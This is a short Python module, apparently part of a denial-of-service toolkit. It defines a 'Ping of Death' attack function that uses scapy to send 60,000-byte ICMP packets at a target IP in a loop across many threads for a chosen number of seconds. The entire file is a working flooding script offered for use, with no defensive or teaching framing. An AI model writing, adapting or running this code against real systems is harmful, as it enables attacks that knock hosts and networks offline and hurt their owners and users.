import random
import time
from scapy.all import IP, ICMP, sendp, send, fragment, conf
from threading import Thread
# Import modules for POD flood
import tools.randomData as randomData

def POD_ATTACK(threads, attack_time, target):
	# Finish
	global FINISH
	FINISH = False

	target_ip = target

	print("[#] Attack started for " + str(attack_time) + " secounds..")
	
	threads_list = []

	# POD flood
	def pod_flood():
		global FINISH
		payload = random.choice(list("1234567890qwertyuiopasdfghjklzxcvbnm")) * 60000
		packet  = IP(dst = target_ip) / ICMP(id = 65535, seq = 65535) / payload

		while not FINISH:
			for i in range(16):
				send(packet, verbose = False)
				print("[+] 60k bytes send..")

	# Start threads
	for thread in range(0, threads):
		print("[#] Staring thread " + str(thread))
		t = Thread(target = pod_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected secounds
	time.sleep(attack_time)
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("[!] Ping of Death attack stopped!")